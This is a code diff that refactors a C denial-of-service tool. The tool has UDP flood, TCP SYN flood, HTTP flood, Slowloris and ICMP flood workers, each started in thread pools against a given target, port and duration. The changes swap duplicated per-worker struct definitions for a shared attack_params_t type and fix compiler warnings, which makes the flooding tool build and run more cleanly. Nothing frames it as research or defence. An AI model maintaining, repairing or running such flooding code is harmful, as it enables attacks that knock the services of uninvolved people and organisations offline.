@@ -14,6 +14,7 @@
 #include <time.h>
 #include <errno.h>
 #include <curl/curl.h>
+#include <fcntl.h>  // Added for fcntl
 
 volatile int attack_active = 0;
 
@@ -24,11 +25,7 @@ volatile int active_threads = 0;
 
 // ==================== UDP FLOOD ====================
 void* udp_flood_worker(void* arg) {
-    struct attack_params {
-        char target[256];
-        int port;
-        int duration;
-    } *params = (struct attack_params*)arg;
+    attack_params_t *params = (attack_params_t*)arg;
     
     int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if(sockfd < 0) {
@@ -78,7 +75,7 @@ void start_udp_flood(const char* target, int port, int duration, int threads) {
     pthread_t thread_pool[threads];
     
     for(int i = 0; i < threads; i++) {
-        struct attack_params* params = malloc(sizeof(struct attack_params));
+        attack_params_t* params = malloc(sizeof(attack_params_t));
         strcpy(params->target, target);
         params->port = port;
         params->duration = duration;
@@ -109,11 +106,7 @@ void start_udp_flood(const char* target, int port, int duration, int threads) {
 
 // ==================== TCP SYN FLOOD ====================
 void* tcp_syn_worker(void* arg) {
-    struct attack_params {
-        char target[256];
-        int port;
-        int duration;
-    } *params = (struct attack_params*)arg;
+    attack_params_t *params = (attack_params_t*)arg;
     
     int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if(sockfd < 0) {
@@ -192,7 +185,7 @@ void start_tcp_syn(const char* target, int port, int duration, int threads) {
     pthread_t thread_pool[threads];
     
     for(int i = 0; i < threads; i++) {
-        struct attack_params* params = malloc(sizeof(struct attack_params));
+        attack_params_t* params = malloc(sizeof(attack_params_t));
         strcpy(params->target, target);
         params->port = port;
         params->duration = duration;
@@ -221,15 +214,12 @@ void start_tcp_syn(const char* target, int port, int duration, int threads) {
 
 // ==================== HTTP FLOOD ====================
 size_t write_null(void *ptr, size_t size, size_t nmemb, void *userdata) {
+    (void)ptr; (void)userdata;
     return size * nmemb;
 }
 
 void* http_flood_worker(void* arg) {
-    struct attack_params {
-        char target[256];
-        int port;
-        int duration;
-    } *params = (struct attack_params*)arg;
+    attack_params_t *params = (attack_params_t*)arg;
     
     CURL *curl;
     CURLcode res;
@@ -299,7 +289,7 @@ void start_http_flood(const char* target, int port, int duration, int threads) {
     pthread_t thread_pool[threads];
     
     for(int i = 0; i < threads; i++) {
-        struct attack_params* params = malloc(sizeof(struct attack_params));
+        attack_params_t* params = malloc(sizeof(attack_params_t));
         strcpy(params->target, target);
         params->port = port;
         params->duration = duration;
@@ -328,11 +318,7 @@ void start_http_flood(const char* target, int port, int duration, int threads) {
 
 // ==================== SLOWLORIS ====================
 void* slowloris_worker(void* arg) {
-    struct attack_params {
-        char target[256];
-        int port;
-        int duration;
-    } *params = (struct attack_params*)arg;
+    attack_params_t *params = (attack_params_t*)arg;
     
     time_t start_time = time(NULL);
     __sync_fetch_and_add(&active_threads, 1);
@@ -387,7 +373,7 @@ void start_slowloris(const char* target, int port, int duration, int threads) {
     pthread_t thread_pool[threads];
     
     for(int i = 0; i < threads; i++) {
-        struct attack_params* params = malloc(sizeof(struct attack_params));
+        attack_params_t* params = malloc(sizeof(attack_params_t));
         strcpy(params->target, target);
         params->port = port;
         params->duration = duration;
@@ -416,10 +402,7 @@ void start_slowloris(const char* target, int port, int duration, int threads) {
 
 // ==================== ICMP FLOOD ====================
 void* icmp_flood_worker(void* arg) {
-    struct attack_params {
-        char target[256];
-        int duration;
-    } *params = (struct attack_params*)arg;
+    attack_params_t *params = (attack_params_t*)arg;
     
     int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
     if(sockfd < 0) {
@@ -490,8 +473,9 @@ void start_icmp_flood(const char* target, int duration, int threads) {
     pthread_t thread_pool[threads];
     
     for(int i = 0; i < threads; i++) {
-        struct attack_params* params = malloc(sizeof(struct attack_params));
+        attack_params_t* params = malloc(sizeof(attack_params_t));
         strcpy(params->target, target);
+        params->port = 0; // Not used for ICMP
         params->duration = duration;
         pthread_create(&thread_pool[i], NULL, icmp_flood_worker, params);
         usleep(10000);
